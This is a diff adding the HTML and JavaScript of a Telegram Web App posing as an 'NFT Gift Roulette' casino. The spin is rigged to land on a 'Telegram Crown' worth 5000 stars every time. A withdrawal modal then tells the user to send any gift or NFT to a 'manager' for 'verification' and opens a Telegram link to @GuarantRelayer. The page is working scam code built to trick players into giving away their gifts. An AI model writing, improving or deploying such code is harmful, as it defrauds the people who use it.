@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gifts Casino</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --accent: #3b82f6;
+            --gold: #eab308;
+            --green: #22c55e;
+            --text: #f8fafc;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            user-select: none;
+        }
+
+        .header {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--card);
+            padding: 12px 16px;
+            border-radius: 12px;
+            box-sizing: border-box;
+            border: 1px solid #334155;
+            margin-bottom: 12px;
+        }
+
+        .balance {
+            color: var(--gold);
+            font-weight: 800;
+            font-size: 18px;
+        }
+
+        .main-card {
+            background: var(--card);
+            border-radius: 16px;
+            padding: 16px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+            border: 1px solid #334155;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .roulette-viewport {
+            width: 100%;
+            height: 110px;
+            background: #020617;
+            border-radius: 12px;
+            margin: 15px 0;
+            overflow: hidden;
+            position: relative;
+            border: 2px solid #334155;
+        }
+
+        .pointer {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 4px;
+            height: 100%;
+            background: var(--gold);
+            z-index: 10;
+            box-shadow: 0 0 10px var(--gold);
+        }
+
+        .tape {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            position: absolute;
+            left: 0;
+            will-change: transform;
+        }
+
+        .item-card {
+            min-width: 80px;
+            height: 90px;
+            margin: 0 4px;
+            background: #0f172a;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #334155;
+            box-sizing: border-box;
+        }
+
+        .item-card .icon { font-size: 34px; }
+        .item-card .name { font-size: 10px; color: #94a3b8; margin-top: 4px; font-weight: bold; }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            margin-top: 8px;
+            text-transform: uppercase;
+            transition: all 0.2s;
+        }
+
+        .btn-spin { background: var(--green); color: #fff; }
+        .btn-withdraw { background: var(--accent); color: #fff; display: none; }
+
+        /* МОДАЛЬНОЕ ОКНО ВЫВОДА / ДЕПОЗИТА */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            box-sizing: border-box;
+        }
+
+        .modal {
+            background: var(--card);
+            padding: 20px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 350px;
+            border: 1px solid #334155;
+        }
+
+        .modal h3 { margin-top: 0; color: var(--gold); }
+        .modal p { font-size: 14px; color: #cbd5e1; line-height: 1.5; }
+
+        .btn-dep {
+            background: linear-gradient(135deg, #eab308, #ca8a04);
+            color: #000;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <span id="username" style="font-weight: bold;">👤 Player</span>
+        <div class="balance">⭐️ <span id="balance">100</span></div>
+    </div>
+
+    <div class="main-card">
+        <h2 style="margin: 0; font-size: 20px;">🎁 NFT Gift Roulette</h2>
+        <p style="color: #94a3b8; font-size: 12px; margin-top: 4px;">Испытай удачу и выбей редкий подарок</p>
+
+        <div class="roulette-viewport">
+            <div class="pointer"></div>
+            <div class="tape" id="tape"></div>
+        </div>
+
+        <div id="win-text" style="height: 24px; font-weight: bold; color: var(--gold); margin-bottom: 8px;"></div>
+
+        <button class="btn btn-spin" id="spin-btn" onclick="startSpin()">КРУТИТЬ (50 ⭐️)</button>
+        <button class="btn btn-withdraw" id="withdraw-btn" onclick="openWithdrawModal()">📥 ВЫВЕСТИ ПРИЗ</button>
+    </div>
+
+    <!-- МОДАЛКА ДЕПОЗИТА -->
+    <div class="modal-overlay" id="modal">
+        <div class="modal">
+            <h3>🔒 Требуется верификация</h3>
+            <p>Для вывода предмета <b>👑 Telegram Crown (5000 ⭐️)</b> необходимо подтвердить аккаунт.</p>
+            <p style="font-size: 12px; color: #94a3b8;">Отправьте <b>любой подарок или NFT</b> менеджеру для верификации вывода.</p>
+            <button class="btn btn-dep" onclick="redirectToRelayer()">🎁 Отправить подарок (@GuarantRelayer)</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const user = tg.initDataUnsafe?.user;
+        if (user) {
+            document.getElementById('username').innerText = `👤 ${user.username || user.first_name}`;
+        }
+
+        let balance = 100;
+
+        // ПУЛ ПРЕДМЕТОВ
+        const DUMMY_ITEMS = [
+            { name: "💩 Poop", icon: "💩" },
+            { name: "🐸 Pepe", icon: "🐸" },
+            { name: "🧸 Bear", icon: "🧸" },
+            { name: "🚀 Rocket", icon: "🚀" }
+        ];
+
+        const WINNING_ITEM = { name: "👑 Crown", icon: "👑" };
+
+        // Заполнение ленты
+        function setupTape() {
+            const tape = document.getElementById('tape');
+            tape.innerHTML = '';
+            
+            // 30 рандомных предметов
+            for (let i = 0; i < 30; i++) {
+                let item = DUMMY_ITEMS[Math.floor(Math.random() * DUMMY_ITEMS.length)];
+                addCardToTape(tape, item);
+            }
+            
+            // На 31-й позицию ставим ГЛАВНЫЙ КУШ
+            addCardToTape(tape, WINNING_ITEM);
+
+            // Еще пару штук в хвост
+            for (let i = 0; i < 10; i++) {
+                let item = DUMMY_ITEMS[Math.floor(Math.random() * DUMMY_ITEMS.length)];
+                addCardToTape(tape, item);
+            }
+        }
+
+        function addCardToTape(container, item) {
+            const div = document.createElement('div');
+            div.className = 'item-card';
+            div.innerHTML = `<div class="icon">${item.icon}</div><div class="name">${item.name}</div>`;
+            container.appendChild(div);
+        }
+
+        function startSpin() {
+            balance -= 50;
+            document.getElementById('balance').innerText = balance;
+
+            const spinBtn = document.getElementById('spin-btn');
+            spinBtn.disabled = true;
+            document.getElementById('win-text').innerText = "Вращение...";
+
+            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+
+            const tape = document.getElementById('tape');
+            tape.style.transition = 'none';
+            tape.style.transform = 'translateX(0px)';
+            tape.offsetHeight; // Reflow
+
+            const itemWidth = 88; // 80px + 8px margin
+            const targetX = -(30 * itemWidth) + (170 - itemWidth / 2);
+
+            tape.style.transition = 'transform 4s cubic-bezier(0.08, 0.9, 0.12, 1)';
+            tape.style.transform = `translateX(${targetX}px)`;
+
+            setTimeout(() => {
+                document.getElementById('win-text').innerText = "ВЫИГРЫШ: 👑 Telegram Crown (5000 ⭐️)!";
+                spinBtn.style.display = 'none';
+                document.getElementById('withdraw-btn').style.display = 'block';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            }, 4100);
+        }
+
+        function openWithdrawModal() {
+            document.getElementById('modal').style.display = 'flex';
+        }
+
+        function redirectToRelayer() {
+            tg.openTelegramLink('https://t.me/GuarantRelayer');
+        }
+
+        setupTape();
+    </script>
+</body>
+</html>
